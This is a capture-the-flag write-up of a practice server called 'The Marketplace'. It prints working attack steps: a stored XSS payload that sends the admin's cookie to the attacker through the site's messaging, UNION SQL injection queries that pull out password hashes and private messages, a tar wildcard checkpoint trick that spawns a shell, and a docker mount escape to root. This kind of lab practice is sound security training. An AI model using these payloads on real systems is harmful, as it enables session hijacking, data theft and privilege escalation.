# Marketplace

> The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.
> Can you take advantage of this and will you be able to gain root access on his server?

Overall, a fun room if not too complicated. I ran into a few troubles, but nothing major.

1. Recon revealed 22, 80 and 32768. Oddly, 80 and 32768 appeared to be the same site, right down to the same database. Not entirely sure why, even after beating the room.

## Exploit 1 - XSS

2. The site was a simple marketplace: you could sign up and create listings, but the image upload was disabled. I experimented with this but was unable to re-enable it.
3. With a listing, you could report it at which point you would receive a message saying the admin is/has reviewed it. You could also send messages. This was the first exploit, when combined with the discovery that the description field of listings allowed script tags (stored XSS). I created a new listing with the following description:

```html
<script>
const XHR = new XMLHttpRequest();
XHR.open('POST', '/contact/myuser');
  XHR.setRequestHeader( 'Content-Type', 'application/x-www-form-urlencoded' );
  XHR.send('message='+escape(document.cookie));
</script>
```

4. Once created I could confirm that my user was getting my cookie, and after reporting the new listing shortly thereafter I got the admin's cookie as well. This allowed me to assume the admin's session, and I got the first flag.

## Exploit 2 - SQLi

5. In the admin area you could see all the users and inspect them. This had the url `/admin?user=1` etc, which I discovered was injectable by adding a `'`. Unfortunately, if the query 'broke' (not a mysql exception, but invalid data for the site) it appeared to invalidate the session token. Several dozen new tokens later (via the reporting process above) and I gave up using `sqlmap` instead opting to try and explore manually.
6. I used `/admin?user=10+union+SELECT+password,+username,+null,+null+FROM+users+LIMIT+1,1` to extract the users from the table and set about breaking them with hashcat. This was a deadend: the encryption was bcrypt (hashes started with $2b$10$) which meant with my 2080 I could only do around a 1000 a second. I broke my own password quickly, but the others are still unbroken as of this writeup, so that was the wrong approach.
7. There was another table, messages, which tracked the between user messages. This was the one area I had skipped as unimportant - bad choice, as the second trick is here. I got a hint for this from reddevil2020. Anyway, the following allowed me to extract the messages one by one: `/admin?user=10+union+select+user_to,+message_content,null,null+from+messages+limit+0,1+`. Uncessary, really, since the first contained the ssh password for the user jake. In jakes home dir was the user flag.

## Exploit 3 - Wildcard Expansion

8. `sudo -l` for jake revealed:

```
User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

The contents of backup.sh, which were not writable by jake, was:

```bash
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

This is pretty obviously tar wildcard expansion, as detailed here: https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/
(Pretty obvious once you've done it before I mean; the tar cf whatever * is fairly distinctive.)

9. To jump to michael I did the following:

    ```
    echo "/bin/bash -p" > demo.sh
    touch -- "--checkpoint=1"
    touch -- "--checkpoint-action=exec=sh demo.sh"
    sudo -u michael /opt/backups/backup.sh
    ```
    
    I deleted backup.tar first, but I am not sure that was necessary.
   
## Exploit 4 - Docker
   
10. michael's user had under its groups docker membership. The following got me the root shell: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
11. The final flag was under /root/root.txt
